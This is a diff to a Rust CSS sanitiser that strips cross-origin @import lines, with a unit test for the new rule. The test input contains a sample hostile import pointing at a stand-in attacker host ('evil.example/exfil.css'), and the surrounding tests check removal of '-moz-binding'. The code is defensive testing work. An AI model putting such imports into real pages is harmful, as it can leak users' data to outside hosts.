@@ -228,6 +228,22 @@ fn sanitize_css_import(line: &str, policy: &Policy) -> (String, Vec<Sanitization
         return ("/* @import removed */".to_string(), actions);
     }
 
+    // Absolute (cross-origin) imports pull in a stylesheet the sanitiser never inspects:
+    // strip them. Relative imports are kept.
+    let is_absolute = norm.contains("://")
+        || norm.contains("url(//")
+        || norm.contains("\"//")
+        || norm.contains("'//");
+    if is_absolute {
+        actions.push(SanitizationAction {
+            rule_fired: "Cross-origin CSS @import stripped".to_string(),
+            location: Location::Document,
+            original_fragment: line.trim().to_string(),
+            replaced_fragment: "/* @import removed */".to_string(),
+        });
+        return ("/* @import removed */".to_string(), actions);
+    }
+
     // Check if url inside @import is blocked
     for blocked in &policy.urls.blocked_domains {
         if norm.contains(blocked) {
@@ -286,6 +302,18 @@ mod tests {
         assert!(!sanitized.contains("-moz-binding"));
         assert!(sanitized.contains("font-size: 14px"));
         assert!(!actions.is_empty());
+    }
+
+    #[test]
+    fn test_cross_origin_import_stripped() {
+        let policy = Policy::balanced();
+        let css = "@import url(\"http://evil.example/exfil.css\");\n@import \"local.css\";\np { color: red; }";
+        let (sanitized, actions) = sanitize_css(css, &policy);
+        assert!(!sanitized.contains("evil.example"));
+        assert!(sanitized.contains("@import \"local.css\""));
+        assert!(actions
+            .iter()
+            .any(|a| a.rule_fired.contains("Cross-origin CSS @import")));
     }
 
     #[test]
